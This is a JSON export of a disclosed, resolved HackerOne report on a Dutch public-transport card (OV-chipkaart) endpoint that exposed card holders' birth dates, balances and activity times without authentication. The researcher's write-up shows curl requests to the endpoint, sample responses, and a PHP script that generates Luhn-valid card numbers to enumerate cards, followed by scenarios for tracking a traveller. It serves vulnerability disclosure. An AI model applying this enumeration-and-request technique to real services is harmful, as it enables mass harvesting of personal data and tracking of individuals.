@@ -1,0 +1,217 @@
+{
+    "abilities": {
+        "can_manage_common_responses?": false, 
+        "can_manage_collaborators?": false, 
+        "can_reopen?": false, 
+        "can_ban_researcher?": false, 
+        "can_create_severity?": false, 
+        "can_assign_to_h1_triage?": false, 
+        "can_agree_on_going_public?": false, 
+        "assignable_team_member_groups": [], 
+        "can_view_credential_account_details?": false, 
+        "can_export?": false, 
+        "can_create_retest?": false, 
+        "can_assign_to_user?": false, 
+        "can_use_common_responses?": false, 
+        "can_hide_timeline?": false, 
+        "can_be_manually_disclosed?": false, 
+        "assignable_team_members": [], 
+        "can_clone?": false, 
+        "can_be_publicly_disclosed?": false, 
+        "can_close_comments?": false, 
+        "can_view_bounty_weights?": false, 
+        "can_suggest_bounty_amount?": false, 
+        "can_cancel_disclosure_request?": false, 
+        "can_redact?": false, 
+        "can_change_structured_scope?": false, 
+        "can_post_internal_comments?": false, 
+        "can_change_state?": false, 
+        "can_change_weakness?": false, 
+        "can_add_comment?": false, 
+        "can_reassign_to_team?": false, 
+        "can_change_title?": false, 
+        "can_award_bounty?": false, 
+        "can_award_swag?": false, 
+        "can_close?": false, 
+        "can_manage?": false
+    }, 
+    "comments_closed?": true, 
+    "substate": "resolved", 
+    "bug_reporter_agreed_on_going_public_at": null, 
+    "voters": [
+        "miguel_santareno", 
+        "jobert", 
+        "michiel", 
+        "kapytein", 
+        "eveeez", 
+        "grampae", 
+        "smelt", 
+        "mygf", 
+        "mefkan", 
+        "salmon", 
+        "and 15 more..."
+    ], 
+    "facebook_team?": false, 
+    "has_bounty?": false, 
+    "rejected_anc_report_that_can_be_sent_back_to_anc_triagers?": false, 
+    "original_report_id": null, 
+    "id": 408583, 
+    "can_view_team": true, 
+    "team_member_agreed_on_going_public_at": null, 
+    "vulnerability_information": "\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588", 
+    "activity_page_count": 1, 
+    "severity": {
+        "metrics": {
+            "confidentiality": "low", 
+            "privileges_required": "none", 
+            "user_interaction": "none", 
+            "attack_vector": "network", 
+            "attack_complexity": "low", 
+            "scope": "unchanged", 
+            "integrity": "none", 
+            "availability": "none"
+        }, 
+        "rating": "medium", 
+        "score": 5.3, 
+        "author_type": "User"
+    }, 
+    "title": "Personal data of all Dutch public transport cards (\"OV-Chipkaart\") accessible", 
+    "is_member_of_team?": null, 
+    "vote_count": 25, 
+    "summaries": [
+        {
+            "category": "team", 
+            "can_create?": false, 
+            "can_view?": true
+        }, 
+        {
+            "category": "researcher", 
+            "can_view?": true, 
+            "can_edit?": false, 
+            "id": 10472, 
+            "content": "December 19, 2017, an [article on Tweakers.net](https://tweakers.net/nieuws/133081/translink-ziet-inzien-saldo-met-willekeurig-ov-chipkaartnummer-niet-als-probleem.html) was published about a publicly accessible form showing the balance and the date of last activity of any public transport card you fill in. Short after this article being published a [comment](https://tweakers.net/nieuws/133081/translink-ziet-inzien-saldo-met-willekeurig-ov-chipkaartnummer-niet-als-probleem.html?showReaction=10937357#r_10937357) on the article stated that the date of birth of the card's owner was also available via the webshop of the Dutch railway company (NS). This was triggering me because it looked like a lot more information than only the balance and last activity date is available via a public accessible endpoint on the web.\n\n##Let's do some\u00a0digging\nFollowing the information in the article on Tweakers.net, I started looking around on the page where a publicly accessible form is available to check the balance of all cards. Via the network tab in the developer tools, I noticed that each request involves Google reCaptcha to pass. Leaving this HTTP header out resulted in an error message.\n\n```bash\ncurl 'https://www.ov-chipkaart.nl/api/medium/v1/saldocheckerpagedata' \\\n  -H 'Host: www.ov-chipkaart.nl' \\\n  -H 'User-Agent: (...)' \\\n  -H 'Referer: https://www.ov-chipkaart.nl/saldo-terugvragen/saldochecker.htm' \\\n  -H 'Content-Type: application/json' \\\n  -H 'Origin: https://www.ov-chipkaart.nl' \\\n  --data '{\"mediumId\":\"352802080********\"}'\n```\n```json\n{\n  \"errorCode\": 120,\n  \"message\": \"Onjuiste recaptcha token.\"\n}\n```\n\nThis endpoint was not much of use\u2026 I decided to log in to my personal account and watch all the network traffic in my developer console while clicking some elements in the dashboard. One of the requests caught my attention: https://www.ov-chipkaart.nl/web/medium_information. This POST request, filled with the parameters `hashedMediumId` and `languagecode`, responded with something I was looking for:\n\n```bash\ncurl 'https://www.ov-chipkaart.nl/web/medium_information' \\\n  -H 'Host: www.ov-chipkaart.nl' \\\n  -H 'User-Agent: (...)' \\\n  -H 'Referer: https://www.ov-chipkaart.nl/mijn-ov-chip/mijn-ov-reishistorie.htm?mediumid=(...)' \\\n  -H 'Content-Type: application/x-www-form-urlencoded; charset=UTF-8' \\\n  -H 'Origin: https://www.ov-chipkaart.nl' \\\n  -H 'Cookie: (...)' \\\n  -H 'X-Requested-With: XMLHttpRequest' \\\n  --data 'hashedMediumId=(...)&languagecode=nl-NL'\n```\n```json\n{\n  \"dateOfBirth\": \"01-01-1970\",\n  \"ePurseRemainingAmount\": 13.37,\n  \"expiryDate\": \"01-01-2022\",\n  \"isAutoReloadActive\": false,\n  \"lastActivityTime\": \"01-01-2017 13:37\",\n  \"locale\": \"nl_NL\",\n  \"localeEPurseRemainingAmount\": \"\u20ac 13,37\",\n  \"mediumId\": \"35280208********\",\n  \"mediumStatus\": \"Active\",\n  \"mediumStatusDescription\": \"Actief\",\n  \"mediumType\": \"Anonymous\",\n  \"mediumTypeDescription\": \"Anonieme OV-chipkaart\"\n}\n```\n\nThe only odd thing about this request was the parameter `hashedMediumId`. Where did its content come from and how was it calculated? Unfortunately, I could not find anything about this method in the resources of the page. A dead end. A bit disappointed I looked at the request again and, in a desperate attempt, I replaced the parameter `hashedMediumId` with just `mediumId`. Laughing at the idea this would ever work, I filled in a plain medium ID `35280208********` and pressed the return key and the exact same result came back!\n\n##Let the fun begin\nSo now I found this endpoint I removed the cookie headers used before in my cURL request and tried again. The same result came back, meaning this request could also be used without authentication to retrieve data from all possible card numbers out there.\n\n\nIn order to confirm this, I made myself a list of possible card numbers, all starting with `35280200`. To rule out a lot of numbers, I checked the validation algorithm behind the OV-Chipkaart. Finding this algorithm wasn\u2019t that hard since the JavaScript validation method in the forms was called `luhnCheck`. So the algorithm used is the *Luhn algorithm*, a modulo 10 check, also used with e.g. IMEI numbers and credit card numbers. To generate this list I created the following PHP snippet:\n\n```php\n<?php\n\nfunction luhnCheck($number) {\n    $number = (string) $number;\n    $l = strlen($number);\n    $n = $o = 0;\n    $r = [\n        [0,1,2,3,4,5,6,7,8,9],\n        [0,2,4,6,8,1,3,5,7,9],\n    ];\n\n    for ($t = $l; $t--; ) {\n        $o += $r[$n][(int) $number{$t}];\n        $n ^= 1;\n    }\n\n    return $o % 10 === 0 && $o > 0;\n}\n\n$fh = fopen(__DIR__ . DIRECTORY_SEPARATOR . 'numbers.txt', 'a+');\n$prefix = 35280200;\n\nfor ($i = 0; $i < 100000000; $i++) {\n    $number = sprintf('%d%08d', $prefix, $i);\n\n    if (luhnCheck($number)) {\n        fwrite($fh, $number . PHP_EOL);\n    }\n}\n\nfclose($fh);\n\n```\n\nIt resulted in a file of 170 MB with 10 million card numbers. Next I picked 5 random numbers;\n\n```bash\nrl -c 5 numbers.txt\n```\n\n\u2026 and tried them all of them with the endpoint. All requests were successful and returned the same data structure as I received with my own card number.\n\n##Impact\nThe impact of this publicly accessible endpoint is huge. I will give three scenarios, but there are a lot more use cases for what you could do with this data.\n\n1. Querying the data of one specific OV-Chipkaart for every minute over a period of a month would give me a good insight into the daily schedule of its user. Calculating the difference of the card\u2019s balance each time I query the data can give me an indication of where the user lives and traveling to since the fares for each route are pretty specific.\n2. Fetching the data of all possible card numbers gives me a nice insight into the average user. I could make charts of the average age of all users. The average balance of all users. The average card type. The total amount of money still available on cards.\n3. Using this form would give me the opportunity to reclaim the balance (max. \u20ac 20,-) of anonymous cards expired less than a year ago.\n", 
+            "content_html": "<p>December 19, 2017, an <a href=\"/redirect?signature=2a69ee72e72d285ad6fa173690061975531c4e2d&amp;url=https%3A%2F%2Ftweakers.net%2Fnieuws%2F133081%2Ftranslink-ziet-inzien-saldo-met-willekeurig-ov-chipkaartnummer-niet-als-probleem.html\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>article on Tweakers.net</span><i class=\"icon-external-link\"></i></a> was published about a publicly accessible form showing the balance and the date of last activity of any public transport card you fill in. Short after this article being published a <a href=\"/redirect?signature=937bd030498e9a41673122555526d1cf29b3dfc1&amp;url=https%3A%2F%2Ftweakers.net%2Fnieuws%2F133081%2Ftranslink-ziet-inzien-saldo-met-willekeurig-ov-chipkaartnummer-niet-als-probleem.html%3FshowReaction%3D10937357%23r_10937357\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>comment</span><i class=\"icon-external-link\"></i></a> on the article stated that the date of birth of the card&#39;s owner was also available via the webshop of the Dutch railway company (NS). This was triggering me because it looked like a lot more information than only the balance and last activity date is available via a public accessible endpoint on the web.</p>\n\n<h2 id=\"let-s-do-some-digging\">Let&#39;s do some\u00a0digging</h2>\n\n<p>Following the information in the article on Tweakers.net, I started looking around on the page where a publicly accessible form is available to check the balance of all cards. Via the network tab in the developer tools, I noticed that each request involves Google reCaptcha to pass. Leaving this HTTP header out resulted in an error message.</p>\n<pre class=\"highlight shell\"><code>curl <span class=\"s1\">&#39;https://www.ov-chipkaart.nl/api/medium/v1/saldocheckerpagedata&#39;</span> <span class=\"se\">\\</span>\n  -H <span class=\"s1\">&#39;Host: www.ov-chipkaart.nl&#39;</span> <span class=\"se\">\\</span>\n  -H <span class=\"s1\">&#39;User-Agent: (...)&#39;</span> <span class=\"se\">\\</span>\n  -H <span class=\"s1\">&#39;Referer: https://www.ov-chipkaart.nl/saldo-terugvragen/saldochecker.htm&#39;</span> <span class=\"se\">\\</span>\n  -H <span class=\"s1\">&#39;Content-Type: application/json&#39;</span> <span class=\"se\">\\</span>\n  -H <span class=\"s1\">&#39;Origin: https://www.ov-chipkaart.nl&#39;</span> <span class=\"se\">\\</span>\n  --data <span class=\"s1\">&#39;{&quot;mediumId&quot;:&quot;352802080********&quot;}&#39;</span>\n</code></pre><pre class=\"highlight json\"><code><span class=\"p\">{</span><span class=\"w\">\n  </span><span class=\"s2\">&quot;errorCode&quot;</span><span class=\"p\">:</span><span class=\"w\"> </span><span class=\"mi\">120</span><span class=\"p\">,</span><span class=\"w\">\n  </span><span class=\"s2\">&quot;message&quot;</span><span class=\"p\">:</span><span class=\"w\"> </span><span class=\"s2\">&quot;Onjuiste recaptcha token.&quot;</span><span class=\"w\">\n</span><span class=\"p\">}</span><span class=\"w\">\n</span></code></pre>\n<p>This endpoint was not much of use\u2026 I decided to log in to my personal account and watch all the network traffic in my developer console while clicking some elements in the dashboard. One of the requests caught my attention: <a title=\"https://www.ov-chipkaart.nl/web/medium_information\" href=\"/redirect?signature=55b74986ff418a7d6ef1e9ec482b0840bb3eef28&amp;url=https%3A%2F%2Fwww.ov-chipkaart.nl%2Fweb%2Fmedium_information\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>https://www.ov-chipkaart.nl/web/medium_information</span><i class=\"icon-external-link\"></i></a>. This POST request, filled with the parameters <code>hashedMediumId</code> and <code>languagecode</code>, responded with something I was looking for:</p>\n<pre class=\"highlight shell\"><code>curl <span class=\"s1\">&#39;https://www.ov-chipkaart.nl/web/medium_information&#39;</span> <span class=\"se\">\\</span>\n  -H <span class=\"s1\">&#39;Host: www.ov-chipkaart.nl&#39;</span> <span class=\"se\">\\</span>\n  -H <span class=\"s1\">&#39;User-Agent: (...)&#39;</span> <span class=\"se\">\\</span>\n  -H <span class=\"s1\">&#39;Referer: https://www.ov-chipkaart.nl/mijn-ov-chip/mijn-ov-reishistorie.htm?mediumid=(...)&#39;</span> <span class=\"se\">\\</span>\n  -H <span class=\"s1\">&#39;Content-Type: application/x-www-form-urlencoded; charset=UTF-8&#39;</span> <span class=\"se\">\\</span>\n  -H <span class=\"s1\">&#39;Origin: https://www.ov-chipkaart.nl&#39;</span> <span class=\"se\">\\</span>\n  -H <span class=\"s1\">&#39;Cookie: (...)&#39;</span> <span class=\"se\">\\</span>\n  -H <span class=\"s1\">&#39;X-Requested-With: XMLHttpRequest&#39;</span> <span class=\"se\">\\</span>\n  --data <span class=\"s1\">&#39;hashedMediumId=(...)&amp;languagecode=nl-NL&#39;</span>\n</code></pre><pre class=\"highlight json\"><code><span class=\"p\">{</span><span class=\"w\">\n  </span><span class=\"s2\">&quot;dateOfBirth&quot;</span><span class=\"p\">:</span><span class=\"w\"> </span><span class=\"s2\">&quot;01-01-1970&quot;</span><span class=\"p\">,</span><span class=\"w\">\n  </span><span class=\"s2\">&quot;ePurseRemainingAmount&quot;</span><span class=\"p\">:</span><span class=\"w\"> </span><span class=\"mf\">13.37</span><span class=\"p\">,</span><span class=\"w\">\n  </span><span class=\"s2\">&quot;expiryDate&quot;</span><span class=\"p\">:</span><span class=\"w\"> </span><span class=\"s2\">&quot;01-01-2022&quot;</span><span class=\"p\">,</span><span class=\"w\">\n  </span><span class=\"s2\">&quot;isAutoReloadActive&quot;</span><span class=\"p\">:</span><span class=\"w\"> </span><span class=\"kc\">false</span><span class=\"p\">,</span><span class=\"w\">\n  </span><span class=\"s2\">&quot;lastActivityTime&quot;</span><span class=\"p\">:</span><span class=\"w\"> </span><span class=\"s2\">&quot;01-01-2017 13:37&quot;</span><span class=\"p\">,</span><span class=\"w\">\n  </span><span class=\"s2\">&quot;locale&quot;</span><span class=\"p\">:</span><span class=\"w\"> </span><span class=\"s2\">&quot;nl_NL&quot;</span><span class=\"p\">,</span><span class=\"w\">\n  </span><span class=\"s2\">&quot;localeEPurseRemainingAmount&quot;</span><span class=\"p\">:</span><span class=\"w\"> </span><span class=\"s2\">&quot;\u20ac 13,37&quot;</span><span class=\"p\">,</span><span class=\"w\">\n  </span><span class=\"s2\">&quot;mediumId&quot;</span><span class=\"p\">:</span><span class=\"w\"> </span><span class=\"s2\">&quot;35280208********&quot;</span><span class=\"p\">,</span><span class=\"w\">\n  </span><span class=\"s2\">&quot;mediumStatus&quot;</span><span class=\"p\">:</span><span class=\"w\"> </span><span class=\"s2\">&quot;Active&quot;</span><span class=\"p\">,</span><span class=\"w\">\n  </span><span class=\"s2\">&quot;mediumStatusDescription&quot;</span><span class=\"p\">:</span><span class=\"w\"> </span><span class=\"s2\">&quot;Actief&quot;</span><span class=\"p\">,</span><span class=\"w\">\n  </span><span class=\"s2\">&quot;mediumType&quot;</span><span class=\"p\">:</span><span class=\"w\"> </span><span class=\"s2\">&quot;Anonymous&quot;</span><span class=\"p\">,</span><span class=\"w\">\n  </span><span class=\"s2\">&quot;mediumTypeDescription&quot;</span><span class=\"p\">:</span><span class=\"w\"> </span><span class=\"s2\">&quot;Anonieme OV-chipkaart&quot;</span><span class=\"w\">\n</span><span class=\"p\">}</span><span class=\"w\">\n</span></code></pre>\n<p>The only odd thing about this request was the parameter <code>hashedMediumId</code>. Where did its content come from and how was it calculated? Unfortunately, I could not find anything about this method in the resources of the page. A dead end. A bit disappointed I looked at the request again and, in a desperate attempt, I replaced the parameter <code>hashedMediumId</code> with just <code>mediumId</code>. Laughing at the idea this would ever work, I filled in a plain medium ID <code>35280208********</code> and pressed the return key and the exact same result came back!</p>\n\n<h2 id=\"let-the-fun-begin\">Let the fun begin</h2>\n\n<p>So now I found this endpoint I removed the cookie headers used before in my cURL request and tried again. The same result came back, meaning this request could also be used without authentication to retrieve data from all possible card numbers out there.</p>\n\n<p>In order to confirm this, I made myself a list of possible card numbers, all starting with <code>35280200</code>. To rule out a lot of numbers, I checked the validation algorithm behind the OV-Chipkaart. Finding this algorithm wasn\u2019t that hard since the JavaScript validation method in the forms was called <code>luhnCheck</code>. So the algorithm used is the <em>Luhn algorithm</em>, a modulo 10 check, also used with e.g. IMEI numbers and credit card numbers. To generate this list I created the following PHP snippet:</p>\n<pre class=\"highlight php\"><code><span class=\"cp\">&lt;?php</span>\n\n<span class=\"k\">function</span> <span class=\"nf\">luhnCheck</span><span class=\"p\">(</span><span class=\"nv\">$number</span><span class=\"p\">)</span> <span class=\"p\">{</span>\n    <span class=\"nv\">$number</span> <span class=\"o\">=</span> <span class=\"p\">(</span><span class=\"nx\">string</span><span class=\"p\">)</span> <span class=\"nv\">$number</span><span class=\"p\">;</span>\n    <span class=\"nv\">$l</span> <span class=\"o\">=</span> <span class=\"nb\">strlen</span><span class=\"p\">(</span><span class=\"nv\">$number</span><span class=\"p\">);</span>\n    <span class=\"nv\">$n</span> <span class=\"o\">=</span> <span class=\"nv\">$o</span> <span class=\"o\">=</span> <span class=\"mi\">0</span><span class=\"p\">;</span>\n    <span class=\"nv\">$r</span> <span class=\"o\">=</span> <span class=\"p\">[</span>\n        <span class=\"p\">[</span><span class=\"mi\">0</span><span class=\"p\">,</span><span class=\"mi\">1</span><span class=\"p\">,</span><span class=\"mi\">2</span><span class=\"p\">,</span><span class=\"mi\">3</span><span class=\"p\">,</span><span class=\"mi\">4</span><span class=\"p\">,</span><span class=\"mi\">5</span><span class=\"p\">,</span><span class=\"mi\">6</span><span class=\"p\">,</span><span class=\"mi\">7</span><span class=\"p\">,</span><span class=\"mi\">8</span><span class=\"p\">,</span><span class=\"mi\">9</span><span class=\"p\">],</span>\n        <span class=\"p\">[</span><span class=\"mi\">0</span><span class=\"p\">,</span><span class=\"mi\">2</span><span class=\"p\">,</span><span class=\"mi\">4</span><span class=\"p\">,</span><span class=\"mi\">6</span><span class=\"p\">,</span><span class=\"mi\">8</span><span class=\"p\">,</span><span class=\"mi\">1</span><span class=\"p\">,</span><span class=\"mi\">3</span><span class=\"p\">,</span><span class=\"mi\">5</span><span class=\"p\">,</span><span class=\"mi\">7</span><span class=\"p\">,</span><span class=\"mi\">9</span><span class=\"p\">],</span>\n    <span class=\"p\">];</span>\n\n    <span class=\"k\">for</span> <span class=\"p\">(</span><span class=\"nv\">$t</span> <span class=\"o\">=</span> <span class=\"nv\">$l</span><span class=\"p\">;</span> <span class=\"nv\">$t</span><span class=\"o\">--</span><span class=\"p\">;</span> <span class=\"p\">)</span> <span class=\"p\">{</span>\n        <span class=\"nv\">$o</span> <span class=\"o\">+=</span> <span class=\"nv\">$r</span><span class=\"p\">[</span><span class=\"nv\">$n</span><span class=\"p\">][(</span><span class=\"nx\">int</span><span class=\"p\">)</span> <span class=\"nv\">$number</span><span class=\"p\">{</span><span class=\"nv\">$t</span><span class=\"p\">}];</span>\n        <span class=\"nv\">$n</span> <span class=\"o\">^=</span> <span class=\"mi\">1</span><span class=\"p\">;</span>\n    <span class=\"p\">}</span>\n\n    <span class=\"k\">return</span> <span class=\"nv\">$o</span> <span class=\"o\">%</span> <span class=\"mi\">10</span> <span class=\"o\">===</span> <span class=\"mi\">0</span> <span class=\"o\">&amp;&amp;</span> <span class=\"nv\">$o</span> <span class=\"o\">&gt;</span> <span class=\"mi\">0</span><span class=\"p\">;</span>\n<span class=\"p\">}</span>\n\n<span class=\"nv\">$fh</span> <span class=\"o\">=</span> <span class=\"nb\">fopen</span><span class=\"p\">(</span><span class=\"nx\">__DIR__</span> <span class=\"o\">.</span> <span class=\"nx\">DIRECTORY_SEPARATOR</span> <span class=\"o\">.</span> <span class=\"s1\">&#39;numbers.txt&#39;</span><span class=\"p\">,</span> <span class=\"s1\">&#39;a+&#39;</span><span class=\"p\">);</span>\n<span class=\"nv\">$prefix</span> <span class=\"o\">=</span> <span class=\"mi\">35280200</span><span class=\"p\">;</span>\n\n<span class=\"k\">for</span> <span class=\"p\">(</span><span class=\"nv\">$i</span> <span class=\"o\">=</span> <span class=\"mi\">0</span><span class=\"p\">;</span> <span class=\"nv\">$i</span> <span class=\"o\">&lt;</span> <span class=\"mi\">100000000</span><span class=\"p\">;</span> <span class=\"nv\">$i</span><span class=\"o\">++</span><span class=\"p\">)</span> <span class=\"p\">{</span>\n    <span class=\"nv\">$number</span> <span class=\"o\">=</span> <span class=\"nb\">sprintf</span><span class=\"p\">(</span><span class=\"s1\">&#39;%d%08d&#39;</span><span class=\"p\">,</span> <span class=\"nv\">$prefix</span><span class=\"p\">,</span> <span class=\"nv\">$i</span><span class=\"p\">);</span>\n\n    <span class=\"k\">if</span> <span class=\"p\">(</span><span class=\"nx\">luhnCheck</span><span class=\"p\">(</span><span class=\"nv\">$number</span><span class=\"p\">))</span> <span class=\"p\">{</span>\n        <span class=\"nb\">fwrite</span><span class=\"p\">(</span><span class=\"nv\">$fh</span><span class=\"p\">,</span> <span class=\"nv\">$number</span> <span class=\"o\">.</span> <span class=\"nx\">PHP_EOL</span><span class=\"p\">);</span>\n    <span class=\"p\">}</span>\n<span class=\"p\">}</span>\n\n<span class=\"nb\">fclose</span><span class=\"p\">(</span><span class=\"nv\">$fh</span><span class=\"p\">);</span>\n\n</code></pre>\n<p>It resulted in a file of 170 MB with 10 million card numbers. Next I picked 5 random numbers;</p>\n<pre class=\"highlight shell\"><code>rl -c 5 numbers.txt\n</code></pre>\n<p>\u2026 and tried them all of them with the endpoint. All requests were successful and returned the same data structure as I received with my own card number.</p>\n\n<h2 id=\"impact\">Impact</h2>\n\n<p>The impact of this publicly accessible endpoint is huge. I will give three scenarios, but there are a lot more use cases for what you could do with this data.</p>\n\n<ol>\n<li>Querying the data of one specific OV-Chipkaart for every minute over a period of a month would give me a good insight into the daily schedule of its user. Calculating the difference of the card\u2019s balance each time I query the data can give me an indication of where the user lives and traveling to since the fares for each route are pretty specific.</li>\n<li>Fetching the data of all possible card numbers gives me a nice insight into the average user. I could make charts of the average age of all users. The average balance of all users. The average card type. The total amount of money still available on cards.</li>\n<li>Using this form would give me the opportunity to reclaim the balance (max. \u20ac 20,-) of anonymous cards expired less than a year ago.</li>\n</ol>\n"
+        }
+    ], 
+    "structured_scope": null, 
+    "allow_singular_disclosure_at": null, 
+    "state": "Closed", 
+    "cve_ids": [], 
+    "activity_page_number": 1, 
+    "readable_substate": "Resolved", 
+    "public": true, 
+    "singular_disclosure_disabled": false, 
+    "activities": [
+        {
+            "automated_response": false, 
+            "reporter": {
+                "username": "bandjes", 
+                "url": "/bandjes"
+            }, 
+            "created_at": "2017-12-19T20:42:30.000Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2017-12-19T20:42:30.000Z", 
+            "actor": {
+                "username": "bandjes", 
+                "url": "/bandjes", 
+                "profile_picture_urls": {
+                    "medium": "/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "ovchipkaart", 
+            "message": "", 
+            "markdown_message": "", 
+            "type": "Activities::BugResolved", 
+            "id": 3323668, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2018-09-11T22:52:47.229Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-09-11T22:52:47.229Z", 
+            "actor": {
+                "username": "bandjes", 
+                "url": "/bandjes", 
+                "profile_picture_urls": {
+                    "medium": "/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "ovchipkaart", 
+            "message": "", 
+            "markdown_message": "", 
+            "type": "Activities::ReportBecamePublic", 
+            "id": 3324765, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2018-09-12T06:31:13.643Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-09-12T06:31:13.643Z", 
+            "actor": {
+                "username": "bandjes", 
+                "url": "/bandjes", 
+                "profile_picture_urls": {
+                    "medium": "/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "additional_data": {
+                "new_severity": "Medium (5.3)", 
+                "old_severity": null
+            }, 
+            "team_handle": "ovchipkaart", 
+            "message": "", 
+            "markdown_message": "", 
+            "type": "Activities::ReportSeverityUpdated", 
+            "id": 3325601, 
+            "genius_execution_id": null
+        }
+    ], 
+    "in_validation?": false, 
+    "is_participant": false, 
+    "reporter": {
+        "username": "bandjes", 
+        "hacker_mediation": false, 
+        "hackerone_triager": false, 
+        "disabled": false, 
+        "url": "/bandjes", 
+        "profile_picture_urls": {
+            "small": "/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"
+        }, 
+        "is_me?": false
+    }, 
+    "is_external_bug": false, 
+    "visibility": "full", 
+    "disclosed_at": "2018-09-11T22:52:47.136Z", 
+    "stage": 4, 
+    "url": "https://hackerone.com/reports/408583", 
+    "created_at": "2017-12-19T20:42:30.000Z", 
+    "original_report_url": null, 
+    "vulnerability_information_html": "<p>\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588</p>\n", 
+    "severity_rating": "medium", 
+    "team_private?": false, 
+    "team": {
+        "profile": {
+            "website": "https://www.ov-chipkaart.nl", 
+            "about": "", 
+            "twitter_handle": "ovchipkaart", 
+            "name": "OV-chipkaart"
+        }, 
+        "handle": "ovchipkaart", 
+        "url": "https://hackerone.com/ovchipkaart", 
+        "profile_picture_urls": {
+            "small": "https://profile-photos.hackerone-user-content.com/000/002/124/a0b24a37adefa872c527360aef709a733a847791_small.png?1433186572", 
+            "medium": "https://profile-photos.hackerone-user-content.com/000/002/124/ab3db9c5a7cece3daa84bc0288c7b78a69cfe820_medium.png?1433186572"
+        }, 
+        "id": 2124, 
+        "permissions": []
+    }, 
+    "is_published": true
+}
